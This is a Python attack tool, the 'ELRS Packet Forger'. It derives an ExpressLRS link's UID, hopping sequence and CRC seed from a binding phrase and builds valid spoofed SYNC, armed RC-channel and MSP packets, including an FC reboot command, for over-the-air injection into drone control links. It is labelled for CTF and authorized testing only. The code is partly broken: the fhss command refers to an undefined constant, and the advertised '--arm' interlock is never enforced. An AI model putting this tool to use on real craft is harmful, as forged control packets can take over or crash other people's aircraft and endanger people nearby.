#!/usr/bin/env python3
"""
ELRS Packet Forger — Craft valid ExpressLRS OTA packets from a binding phrase

Given a binding phrase, derives every cryptographic parameter (UID, FHSS
hopping sequence, CRC initializer) and builds wire-ready SYNC, RC channel
data, and MSP-over-ELRS packets.

Supports OTA v3 (ELRS 3.x, OTA_VERSION_ID=3) and v4 (ELRS 4.x,
OTA_VERSION_ID=4) via --ota-version.

Security model recap (see firmware/README.md):
    Binding phrase → MD5 → UID[0:6]
    UID seeds FHSS, CRC, and the sync-channel identifier.
    No encryption on any OTA packet.

Simulation mode by default — prints hex packets to stdout.  Use with an
SX1280 TX path or SDR for over-the-air injection (requires --arm).

Usage:
    # Show derived crypto state for a binding phrase
    python3 elrs-packet-forger.py --phrase "iloveflying" info

    # Generate a SYNC packet (v3, live TinyHawk default)
    python3 elrs-packet-forger.py --phrase "iloveflying" sync

    # Generate RC channel data with specific stick values
    python3 elrs-packet-forger.py --phrase "iloveflying" rc --channels 1500,1500,1000,1500

    # Generate an MSP command (e.g. FC reboot = MSP 68)
    python3 elrs-packet-forger.py --phrase "iloveflying" msp --msp-cmd 68

    # Use OTA v3 instead of v4
    python3 elrs-packet-forger.py --phrase "iloveflying" --ota-version 3 sync

    # Full-res 13-byte packet mode (CRC16)
    python3 elrs-packet-forger.py --phrase "iloveflying" --full-res sync

    # Dump the full 256-entry FHSS hopping sequence
    python3 elrs-packet-forger.py --phrase "iloveflying" fhss

For CTF research and authorized security testing only.
"""

import hashlib
import argparse
import struct
import sys

from elrs_core.crc import Crc2Byte, ELRS_CRC14_POLY, ELRS_CRC16_POLY
from elrs_core.fhss import build_sequence

# ---------------------------------------------------------------------------
# Constants from ExpressLRS source
# ---------------------------------------------------------------------------

FHSS_SEQUENCE_LEN = 256
ISM2G4_FREQ_COUNT = 80
ISM2G4_FREQ_START_HZ = 2400400000
ISM2G4_FREQ_STOP_HZ = 2479400000

# Packet header types (low 2 bits of first byte for std packets)
PACKET_TYPE_RCDATA = 0b00
PACKET_TYPE_DATA = 0b01
PACKET_TYPE_SYNC = 0b10

# Standard packet = 8 bytes (CRC14), full-res = 13 bytes (CRC16)
OTA4_PACKET_SIZE = 8
OTA8_PACKET_SIZE = 13

# MSP v2 over ELRS
MSP_V2_FRAME_ID = 0x50  # MSPv2 command

# CRSF channel center (1500us) mapped to 11-bit
CRSF_CHANNEL_VALUE_MID = 992
CRSF_CHANNEL_VALUE_MIN = 172
CRSF_CHANNEL_VALUE_MAX = 1811


# ---------------------------------------------------------------------------
# UID derivation (same as elrs-uid-rainbow.py)
# ---------------------------------------------------------------------------

def phrase_to_uid(phrase: str) -> bytes:
    raw = f'-DMY_BINDING_PHRASE="{phrase}"'
    return hashlib.md5(raw.encode()).digest()[:6]


# ---------------------------------------------------------------------------
# Seed and CRC init derivation
# ---------------------------------------------------------------------------

def uid_to_fhss_seed(uid: bytes, ota_version: int) -> int:
    return ((uid[2] << 24) | (uid[3] << 16) |
            (uid[4] << 8) | (uid[5] ^ ota_version))


def uid_to_crc_init(uid: bytes, ota_version: int) -> int:
    init = (uid[4] << 8) | uid[5]
    # Betaflight 4.4.2's v3 path XORs the version into the low byte. ELRS v4
    # moved it to the high byte to reserve the low byte for the nonce.
    return init ^ (ota_version if ota_version == 3 else ota_version << 8)


# ---------------------------------------------------------------------------
# FHSS sequence generation (from FHSS/FHSS.cpp)
# ---------------------------------------------------------------------------

def sync_channel_for_version(ota_version: int, freq_count: int = ISM2G4_FREQ_COUNT) -> int:
    """ELRS v3 uses the legacy +1 channel; v4 uses the center channel."""
    if ota_version not in (3, 4):
        raise ValueError(f"unsupported OTA version: {ota_version}")
    return freq_count // 2 + (1 if ota_version == 3 else 0)


def generate_fhss_sequence(seed: int, freq_count: int = ISM2G4_FREQ_COUNT,
                           ota_version: int = 3) -> list[int]:
    return build_sequence(seed, freq_count,
                          sync_channel_for_version(ota_version, freq_count),
                          FHSS_SEQUENCE_LEN)


def data_crc_init(crc_init: int, nonce: int, ota_version: int) -> int:
    """Only OTA v4 mixes the nonce into non-SYNC packet CRCs."""
    if ota_version not in (3, 4):
        raise ValueError(f"unsupported OTA version: {ota_version}")
    return crc_init ^ ((nonce & 0xFF) if ota_version == 4 else 0)


def fhss_index_to_freq_hz(channel: int) -> int:
    spread = (ISM2G4_FREQ_STOP_HZ - ISM2G4_FREQ_START_HZ) / (ISM2G4_FREQ_COUNT - 1)
    return int(ISM2G4_FREQ_START_HZ + channel * spread)


# ---------------------------------------------------------------------------
# Microseconds ↔ CRSF channel value conversion
# ---------------------------------------------------------------------------

def us_to_crsf(us: int) -> int:
    """Convert microseconds (988–2012) to 11-bit CRSF value."""
    return max(CRSF_CHANNEL_VALUE_MIN,
               min(CRSF_CHANNEL_VALUE_MAX,
                   int((us - 988) * (CRSF_CHANNEL_VALUE_MAX - CRSF_CHANNEL_VALUE_MIN) / (2012 - 988) + CRSF_CHANNEL_VALUE_MIN)))


def crsf_to_uint10(ch11: int) -> int:
    """Decimate 11-bit to 10-bit (Limit mode — clamp to std range)."""
    STD_MIN = 191
    STD_MAX = 1792
    ch11 = max(STD_MIN, min(STD_MAX, ch11))
    return int((ch11 - STD_MIN) * 1023 / (STD_MAX - STD_MIN))


# ---------------------------------------------------------------------------
# Packet builders
# ---------------------------------------------------------------------------

def pack_channels_4x10(channels_11bit: list[int]) -> bytes:
    """Pack 4 × 10-bit channels into 5 bytes (little-endian bit packing)."""
    vals = [crsf_to_uint10(ch) for ch in channels_11bit[:4]]
    bits = 0
    total = 0
    for v in vals:
        total |= (v & 0x3FF) << bits
        bits += 10
    return total.to_bytes(5, 'little')


def build_sync_packet(uid: bytes, nonce: int, fhss_index: int,
                      crc_init: int, crc_engine: Crc2Byte,
                      rate_enum: int = 4, switch_enc_mode: int = 0,
                      tlm_ratio: int = 0, gemini: int = 0,
                      ota_protocol: int = 0, full_res: bool = False) -> bytes:
    """Build an OTA SYNC packet (std 8-byte or full-res 13-byte)."""
    flags = (switch_enc_mode & 1) | ((tlm_ratio & 7) << 1) | ((gemini & 1) << 4) | ((ota_protocol & 3) << 5)

    if full_res:
        # OTA_Packet8_s: first byte low 2 bits = type
        pkt = bytearray(OTA8_PACKET_SIZE)
        pkt[0] = PACKET_TYPE_SYNC  # low 2 bits
        # OTA_Sync_s starts at byte 1
        pkt[1] = fhss_index & 0xFF
        pkt[2] = nonce & 0xFF
        pkt[3] = rate_enum & 0xFF
        pkt[4] = flags & 0xFF
        pkt[5] = uid[4]
        pkt[6] = uid[5]
        # bytes 7-10 are free (zeros)
        # CRC16 over bytes 0..10 (11 bytes), no nonce XOR for SYNC
        crc = crc_engine.calc(bytes(pkt[:11]), crc_init)
        pkt[11] = crc & 0xFF
        pkt[12] = (crc >> 8) & 0xFF
        return bytes(pkt)
    else:
        # OTA_Packet4_s: byte 0 = [crcHigh:6][type:2]
        pkt = bytearray(OTA4_PACKET_SIZE)
        pkt[0] = PACKET_TYPE_SYNC & 0x03  # crcHigh zeroed for CRC calc
        # OTA_Sync_s occupies bytes 1–6
        pkt[1] = fhss_index & 0xFF
        pkt[2] = nonce & 0xFF
        pkt[3] = rate_enum & 0xFF
        pkt[4] = flags & 0xFF
        pkt[5] = uid[4]
        pkt[6] = uid[5]
        # CRC14 over bytes 0..6 (7 bytes), no nonce XOR for SYNC
        crc = crc_engine.calc(bytes(pkt[:7]), crc_init)
        pkt[0] |= ((crc >> 8) & 0x3F) << 2
        pkt[7] = crc & 0xFF
        return bytes(pkt)


def build_rc_packet(channels_us: list[int], nonce: int,
                    crc_init: int, crc_engine: Crc2Byte,
                    is_armed: bool = False, full_res: bool = False,
                    ota_version: int = 3) -> bytes:
    """Build an OTA RC channel data packet."""
    channels_crsf = [us_to_crsf(ch) for ch in channels_us]
    while len(channels_crsf) < 4:
        channels_crsf.append(CRSF_CHANNEL_VALUE_MID)

    if full_res:
        pkt = bytearray(OTA8_PACKET_SIZE)
        pkt[0] = PACKET_TYPE_RCDATA & 0x03
        if is_armed:
            pkt[0] |= (1 << 7)
        ch_low = pack_channels_4x10(channels_crsf[:4])
        ch_high = pack_channels_4x10([CRSF_CHANNEL_VALUE_MID] * 4)
        pkt[1:6] = ch_low
        pkt[6:11] = ch_high
        crc = crc_engine.calc(bytes(pkt[:11]), data_crc_init(crc_init, nonce, ota_version))
        pkt[11] = crc & 0xFF
        pkt[12] = (crc >> 8) & 0xFF
        return bytes(pkt)
    else:
        pkt = bytearray(OTA4_PACKET_SIZE)
        pkt[0] = PACKET_TYPE_RCDATA & 0x03
        ch_packed = pack_channels_4x10(channels_crsf[:4])
        pkt[1:6] = ch_packed
        switches = 0
        if is_armed:
            pkt[6] = 0x80  # isArmed bit
        else:
            pkt[6] = 0x00
        pkt[6] |= switches & 0x7F
        crc = crc_engine.calc(bytes(pkt[:7]), data_crc_init(crc_init, nonce, ota_version))
        pkt[0] |= ((crc >> 8) & 0x3F) << 2
        pkt[7] = crc & 0xFF
        return bytes(pkt)


def build_msp_packet(msp_cmd: int, msp_payload: bytes,
                     nonce: int, crc_init: int, crc_engine: Crc2Byte,
                     package_index: int = 0,
                     full_res: bool = False, ota_version: int = 3) -> bytes:
    """Build an OTA DATA packet carrying an MSP command (uplink)."""
    if full_res:
        pkt = bytearray(OTA8_PACKET_SIZE)
        pkt[0] = (PACKET_TYPE_DATA & 0x03) | ((package_index & 0x1F) << 3)
        # MSP payload: [frame_id, payload_len_lo, payload_len_hi, cmd_lo, cmd_hi, ...data...]
        msp_frame = bytearray()
        msp_frame.append(MSP_V2_FRAME_ID)
        msp_frame.append(len(msp_payload) & 0xFF)
        msp_frame.append((len(msp_payload) >> 8) & 0xFF)
        msp_frame.append(msp_cmd & 0xFF)
        msp_frame.append((msp_cmd >> 8) & 0xFF)
        msp_frame.extend(msp_payload)
        max_payload = 10  # ELRS8_DATA_UL_BYTES_PER_CALL
        pkt[1:1 + min(len(msp_frame), max_payload)] = msp_frame[:max_payload]
        crc = crc_engine.calc(bytes(pkt[:11]), data_crc_init(crc_init, nonce, ota_version))
        pkt[11] = crc & 0xFF
        pkt[12] = (crc >> 8) & 0xFF
        return bytes(pkt)
    else:
        pkt = bytearray(OTA4_PACKET_SIZE)
        pkt[0] = PACKET_TYPE_DATA & 0x03
        # byte 1: [stubbornAck:1][packageIndex:7]
        pkt[1] = package_index & 0x7F
        # MSP payload bytes
        msp_frame = bytearray()
        msp_frame.append(MSP_V2_FRAME_ID)
        msp_frame.append(len(msp_payload) & 0xFF)
        msp_frame.append((len(msp_payload) >> 8) & 0xFF)
        msp_frame.append(msp_cmd & 0xFF)
        msp_frame.append((msp_cmd >> 8) & 0xFF)
        msp_frame.extend(msp_payload)
        max_payload = 5  # ELRS4_DATA_UL_BYTES_PER_CALL
        pkt[2:2 + min(len(msp_frame), max_payload)] = msp_frame[:max_payload]
        crc = crc_engine.calc(bytes(pkt[:7]), data_crc_init(crc_init, nonce, ota_version))
        pkt[0] |= ((crc >> 8) & 0x3F) << 2
        pkt[7] = crc & 0xFF
        return bytes(pkt)


# ---------------------------------------------------------------------------
# Hex formatting
# ---------------------------------------------------------------------------

def hex_dump(data: bytes, label: str = "") -> str:
    hex_str = " ".join(f"{b:02X}" for b in data)
    if label:
        return f"{label}: [{hex_str}] ({len(data)} bytes)"
    return f"[{hex_str}] ({len(data)} bytes)"


def uid_hex(uid: bytes) -> str:
    return ":".join(f"{b:02X}" for b in uid)


# ---------------------------------------------------------------------------
# Subcommands
# ---------------------------------------------------------------------------

def cmd_info(uid, ota_version, fhss_seed, crc_init, fhss_seq, args):
    print(f"Binding phrase:  \"{args.phrase}\"")
    print(f"OTA version:     {ota_version}")
    print(f"UID:             {uid_hex(uid)}")
    print(f"UID bytes:       {list(uid)}")
    print(f"SYNC visible:    {uid[4]:02X}:{uid[5]:02X}  (UID[4:5] in every SYNC packet)")
    print(f"FHSS seed:       0x{fhss_seed:08X}")
    print(f"CRC init:        0x{crc_init:04X}")
    sync_channel = sync_channel_for_version(ota_version)
    print(f"Sync channel:    {sync_channel}  ({fhss_index_to_freq_hz(sync_channel) / 1e6:.1f} MHz)")
    print(f"FHSS seq length: {len(fhss_seq)}")
    mode = "full-res (13B, CRC16)" if args.full_res else "standard (8B, CRC14)"
    print(f"Packet mode:     {mode}")


def cmd_sync(uid, nonce, fhss_seq, crc_init, crc_engine, args):
    fhss_idx = args.fhss_index if args.fhss_index is not None else 0
    pkt = build_sync_packet(uid, nonce, fhss_idx, crc_init, crc_engine,
                            full_res=args.full_res)
    freq = fhss_index_to_freq_hz(fhss_seq[fhss_idx % len(fhss_seq)])

    print(f"SYNC packet (nonce={nonce}, fhssIndex={fhss_idx}, freq={freq / 1e6:.1f} MHz)")
    print(hex_dump(pkt, "  OTA"))
    if args.raw:
        sys.stdout.buffer.write(pkt)


def cmd_rc(uid, nonce, crc_init, crc_engine, args):
    channels = [1500, 1500, 1000, 1500]
    if args.channels:
        parts = args.channels.split(",")
        for i, p in enumerate(parts[:4]):
            channels[i] = int(p.strip())

    pkt = build_rc_packet(channels, nonce, crc_init, crc_engine,
                          is_armed=args.armed, full_res=args.full_res,
                          ota_version=args.ota_version)

    print(f"RC packet (nonce={nonce}, armed={args.armed})")
    print(f"  Channels (us): {channels}")
    print(hex_dump(pkt, "  OTA"))
    if args.raw:
        sys.stdout.buffer.write(pkt)


def cmd_msp(uid, nonce, crc_init, crc_engine, args):
    msp_cmd = args.msp_cmd
    msp_payload = bytes()
    if args.msp_payload:
        msp_payload = bytes.fromhex(args.msp_payload.replace(":", "").replace(" ", ""))

    pkt = build_msp_packet(msp_cmd, msp_payload, nonce, crc_init, crc_engine,
                           full_res=args.full_res, ota_version=args.ota_version)

    print(f"MSP packet (nonce={nonce}, cmd={msp_cmd} / 0x{msp_cmd:04X})")
    if msp_payload:
        print(f"  MSP payload: {msp_payload.hex()}")
    print(hex_dump(pkt, "  OTA"))
    if args.raw:
        sys.stdout.buffer.write(pkt)


def cmd_fhss(fhss_seq, args):
    print(f"FHSS hopping sequence ({len(fhss_seq)} entries, {ISM2G4_FREQ_COUNT} channels)")
    print(f"Sync channel: {ISM2G4_SYNC_CHANNEL}")
    print()
    for i, ch in enumerate(fhss_seq):
        freq = fhss_index_to_freq_hz(ch)
        marker = " <-- SYNC" if ch == ISM2G4_SYNC_CHANNEL else ""
        print(f"  [{i:3d}] ch={ch:2d}  {freq / 1e6:.1f} MHz{marker}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    parser = argparse.ArgumentParser(
        description="ELRS Packet Forger — craft valid OTA packets from a binding phrase",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="For CTF research and authorized security testing only.",
    )
    parser.add_argument("--phrase", required=True,
                        help="ELRS binding phrase")
    parser.add_argument("--ota-version", type=int, default=3, choices=[3, 4],
                        help="OTA version ID (3 for the live 4.4.2 target; 4 for ELRS 4.x; default: 3)")
    parser.add_argument("--nonce", type=int, default=0,
                        help="Packet nonce / counter (0–255, default: 0)")
    parser.add_argument("--full-res", action="store_true",
                        help="Use full-resolution 13-byte packets (CRC16) instead of standard 8-byte (CRC14)")
    parser.add_argument("--raw", action="store_true",
                        help="Also write raw binary packet to stdout (for piping)")
    parser.add_argument("--arm", action="store_true",
                        help="Required flag for any TX-capable mode (safety interlock)")

    subparsers = parser.add_subparsers(dest="command", required=True)

    subparsers.add_parser("info", help="Show derived crypto state")

    sp_sync = subparsers.add_parser("sync", help="Generate a SYNC packet")
    sp_sync.add_argument("--fhss-index", type=int, default=None,
                         help="FHSS sequence index (default: 0)")

    sp_rc = subparsers.add_parser("rc", help="Generate an RC channel data packet")
    sp_rc.add_argument("--channels", type=str, default=None,
                       help="Comma-separated channel values in microseconds (default: 1500,1500,1000,1500)")
    sp_rc.add_argument("--armed", action="store_true",
                       help="Set armed flag in the packet")

    sp_msp = subparsers.add_parser("msp", help="Generate an MSP-over-ELRS data packet")
    sp_msp.add_argument("--msp-cmd", type=int, required=True,
                        help="MSP command number (e.g. 68 for reboot)")
    sp_msp.add_argument("--msp-payload", type=str, default=None,
                        help="MSP payload as hex string (e.g. '01' or '01:02:03')")

    subparsers.add_parser("fhss", help="Dump the full FHSS hopping sequence")

    args = parser.parse_args()

    # Derive crypto state
    ota_version = args.ota_version
    uid = phrase_to_uid(args.phrase)
    fhss_seed = uid_to_fhss_seed(uid, ota_version)
    crc_init = uid_to_crc_init(uid, ota_version)
    fhss_seq = generate_fhss_sequence(fhss_seed, ota_version=ota_version)

    # Select CRC engine
    if args.full_res:
        crc_engine = Crc2Byte(16, ELRS_CRC16_POLY)
    else:
        crc_engine = Crc2Byte(14, ELRS_CRC14_POLY)

    nonce = args.nonce & 0xFF

    print(f"[*] Phrase: \"{args.phrase}\" | OTA v{ota_version} | UID: {uid_hex(uid)}", file=sys.stderr)
    print(f"[*] FHSS seed: 0x{fhss_seed:08X} | CRC init: 0x{crc_init:04X}", file=sys.stderr)

    if args.command == "info":
        cmd_info(uid, ota_version, fhss_seed, crc_init, fhss_seq, args)

    elif args.command == "sync":
        cmd_sync(uid, nonce, fhss_seq, crc_init, crc_engine, args)

    elif args.command == "rc":
        cmd_rc(uid, nonce, crc_init, crc_engine, args)

    elif args.command == "msp":
        cmd_msp(uid, nonce, crc_init, crc_engine, args)

    elif args.command == "fhss":
        cmd_fhss(fhss_seq, args)


if __name__ == "__main__":
    main()
